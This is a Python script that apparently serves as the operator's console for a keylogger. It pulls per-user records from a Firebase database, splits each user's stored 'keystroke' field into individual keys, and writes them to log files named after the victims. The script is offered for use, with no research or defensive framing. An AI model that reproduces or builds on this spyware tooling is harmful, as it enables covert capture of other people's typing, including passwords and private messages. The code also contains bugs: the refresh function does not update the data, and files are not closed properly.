from firebase import firebase
import requests

firebase = firebase.FirebaseApplication('https://testunessayproject.firebaseio.com/', None)
result = firebase.get('person', None)


def getAll():
	print('\n')
	for x in result:
		f = result[x]['user']+"_Log.txt"
		file = open(f, "w", encoding="utf-8")
		for i in result[x]:
			file.write(i+":\n")
			if i=="keystroke":
				keys = result[x][i].split("~")
				for j in keys:
					file.write(j + "\n")
			else:
				file.write(result[x][i]+"\n")
		file.write("\n")
	file.close()
	print('Done\n')

def refresh():
	print('\n')
	result = firebase.get('person', None)
	print('Refresh Done\n')

def getUser():
	refresh()
	print('\n')
	for x in result:
		name = result[x]['user']
		print(name)
	print('\ndone\n')
	

def getByName():
	refresh()
	print('\n')
	i=0
	for x in result:
		name = result[x]['user']
		print( f'{i} : {name}')
		i += 1
	
	num = int(input('choose the number: '))

	i = 0
	for x in result:
		name = result[x]['user']
		if i == num:
			f = result[x]['user']+"_Log.txt"
			file = open(f, "w", encoding="utf-8")
			for y in result[x]:
				file.write(y+":\n")
				if y=="keystroke":
					keys = result[x][y].split("~")
					for j in keys:
						file.write(j + "\n")
				else:
					file.write(result[x][y]+"\n")
			file.write("\n")
		i += 1
	print('Done\n')
	

if __name__=='__main__':
	while True:
		try:
			i = int(input("0 to get log from all user \n1 to get name of all users \n2 to choose a user for a log file \n3 to stop\nEnter: "))
			if i == 0:
				getAll()
			if i == 1:
				getUser()
			if i == 2:
				getByName()
			if i==3:
				break
			if i != 0 and i !=1 and i!=2 and i!=3:
				print('wrong')
		except:
			continue
		
